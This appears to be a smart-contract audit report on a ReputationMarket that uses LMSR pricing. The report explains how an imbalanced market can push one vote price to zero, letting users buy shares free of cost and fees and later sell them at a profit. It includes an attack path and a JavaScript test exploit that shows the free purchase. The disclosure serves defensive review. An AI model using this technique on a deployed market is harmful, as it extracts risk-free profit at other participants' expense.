# price can reach zero in imbalanced markets, can cause issues

### Summary

Due to precision loss and how LMSR works, if the difference between the amount of outstanding shares is big enough, one of the share prices can hit zero. If a price hits zero within markets that use LMSR, under normal conditions this would mean that no shares would be sold, creating a deadlock. However ReputationMarket will keep giving free shares to users without any fees. Although there is no total value loss, because shares can be bought for free and the price can later increase due to market activity, this creates a potential profit with no downside. Also buying these shares will cost no fees.

### Root Cause

Allowing users to buy shares for free

### Internal Pre-conditions

1. Outstanding shares of one of the votes is much greater than the other such that one of the shares is priced at zero

### External Pre-conditions

_No response_

### Attack Path

1. User buys shares that are priced at zero
2. If the other shares are sold or more shares that were priced at zero are bought, user can sell these shares that were bought for free


### Impact

Users are able to trade risk free, also without paying fees.

### PoC

  Note that this test will fail because gas costs are not taken into consideration, but on the output you can see only the gas costs were paid.
  ```javascript
    it('should let user buy shares for free', async () => {
      const billionEth = ethers.parseEther('1000000000');
      const maxVotes = 133000n - 1n;

      // Buy many distrust votes to push trust price down
      await userA.buyVotes({
        votesToBuy: maxVotes,
        buyAmount: billionEth,
        isPositive: false,
      });

      const balanceBefore = await ethers.provider.getBalance(userA.signer.address);

      const trustPrice = await reputationMarket.getVotePrice(DEFAULT.profileId, true);
      expect(Number(trustPrice)).to.equal(0);

      await userA.buyVotes({
        votesToBuy: 80000n,
        isPositive: true,
      });

      const balanceAfter = await ethers.provider.getBalance(userA.signer.address);

      // this will fail as gas costs are not taken for consideration
      expect(balanceAfter).to.equal(balanceBefore, 'Balance did not decrease after buying votes');
    });
```

### Mitigation

Do not let users buy shares when price hits 0.
